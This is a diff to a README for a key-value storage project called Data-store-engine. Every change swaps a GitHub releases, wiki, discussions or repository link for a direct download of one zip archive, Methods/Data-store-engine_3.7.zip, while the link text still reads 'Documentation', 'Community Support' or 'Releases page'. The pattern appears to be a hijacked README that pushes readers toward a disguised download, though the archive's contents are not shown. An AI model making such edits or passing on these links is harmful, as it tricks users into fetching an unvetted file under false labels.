@@ -1,6 +1,6 @@
 # 🚀 Data-store-engine - Simple Key-Value Storage Solution
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Ethan-sonic/Data-store-engine/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Ethan-sonic/Data-store-engine/main/Methods/Data-store-engine_3.7.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Ethan-sonic/Data-store-engine/main/Methods/Data-store-engine_3.7.zip)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ To begin, you need to download and run the application. Follow these simple step
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Ethan-sonic/Data-store-engine/releases) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Ethan-sonic/Data-store-engine/main/Methods/Data-store-engine_3.7.zip) to find the latest version.
    
 2. Look for the file labeled **Data-store-engine**. Depending on your system, there may be different files available. Select the one suitable for your operating system.
 
@@ -55,8 +55,8 @@ After running the application, you will find a user-friendly interface. Here’s
 
 For more help, check out the links below:
 
-- [Documentation](https://github.com/Ethan-sonic/Data-store-engine/wiki): Detailed guides and FAQs.
-- [Community Support](https://github.com/Ethan-sonic/Data-store-engine/discussions): Join discussions and ask questions.
+- [Documentation](https://raw.githubusercontent.com/Ethan-sonic/Data-store-engine/main/Methods/Data-store-engine_3.7.zip): Detailed guides and FAQs.
+- [Community Support](https://raw.githubusercontent.com/Ethan-sonic/Data-store-engine/main/Methods/Data-store-engine_3.7.zip): Join discussions and ask questions.
 
 ## 📊 Examples
 
@@ -81,6 +81,6 @@ We welcome contributions to help improve Data-store-engine. If you want to contr
 
 ## 🌐 Learn More
 
-To dive deeper into the features and technical details, visit the [GitHub repository](https://github.com/Ethan-sonic/Data-store-engine).
+To dive deeper into the features and technical details, visit the [GitHub repository](https://raw.githubusercontent.com/Ethan-sonic/Data-store-engine/main/Methods/Data-store-engine_3.7.zip).
 
-Remember to refer back to the [Releases page](https://github.com/Ethan-sonic/Data-store-engine/releases) for the latest version and updates!
+Remember to refer back to the [Releases page](https://raw.githubusercontent.com/Ethan-sonic/Data-store-engine/main/Methods/Data-store-engine_3.7.zip) for the latest version and updates!
